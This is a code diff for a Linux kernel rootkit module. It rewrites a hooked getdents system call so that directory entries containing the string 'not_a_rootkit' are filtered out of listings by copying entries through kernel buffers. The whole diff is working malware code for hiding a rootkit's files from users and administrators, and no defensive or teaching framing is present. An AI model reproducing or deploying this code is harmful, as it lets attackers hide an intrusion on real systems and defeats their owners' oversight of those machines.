@@ -11,31 +11,43 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent64 __user *
 		return ret;
 	}
 
-	char *dir_ref = (char *)dirent;
-	int offset = 0;
-	while (offset < ret) {
-		//char *entry_addr = dir_ref + offset;
-		struct linux_dirent64 *cur_entry = (struct linux_dirent64 *)(dir_ref + offset);
-
-		/* search for any occurance of our module */
-		if (strstr(cur_entry->d_name, "not_a_rootkit") != NULL) {
-			/* copy over the entry with all entries after it */
-			//char *entry_end = dir_ref + offset + cur_entry->d_reclen;
-
-			/* size to copy will be everything after this entry */
-			//size_t len = ret - (offset + cur_entry->d_reclen);
-
-			memcpy(dir_ref + offset, dir_ref + offset + cur_entry->d_reclen, ret - (offset + cur_entry->d_reclen));
-
-			/* adjust length reported */
-			ret -= cur_entry->d_reclen;
-		} else {
-			offset += cur_entry->d_reclen;
-		}
-		/* if we do remove an entry, offset will be pointing at new entry to examine */
+	/* dirent struct holding the adjusted entries */
+	struct linux_dirent64 *ret_dir = kmalloc(ret, GFP_KERNEL);
+	if (ret_dir == NULL) {
+		return ret;
 	}
 
-	return ret;
+	/* dirent in kernel space to copy to */
+	struct linux_dirent64 *k_dir = kmalloc(ret, GFP_KERNEL);
+	if (k_dir == NULL) {
+		kfree(ret_dir);
+		return ret;
+	}
+
+	copy_from_user(k_dir, dirent, ret);
+
+	long new_len = 0;					/* adjusted length reported back */
+	struct linux_dirent64 *ref_dir;		/* entry being examined */
+	int offset = 0;						/* offset into entries */
+
+	while (offset < ret) {
+		unsigned char *cur_ref = (unsigned char *)k_dir + offset;
+		ref_dir = (struct linux_dirent64 *)cur_ref;
+
+		if (strstr(ref_dir->d_name, "not_a_rootkit") == NULL) {			
+			/* valid dirent, append it */
+			memcpy((void *)ret_dir+new_len, ref_dir, ref_dir->d_reclen);
+			new_len += ref_dir->d_reclen;
+		}	/* else the entry contains the forbidden text, ignore it */
+
+		offset += ref_dir->d_reclen;
+	}
+	/* copy over the original dirent */
+	copy_to_user(dirent, ret_dir, new_len);
+	kfree(k_dir);
+	kfree(ret_dir);
+
+	return new_len;
 }
 
 #define START_SEARCH PAGE_OFFSET
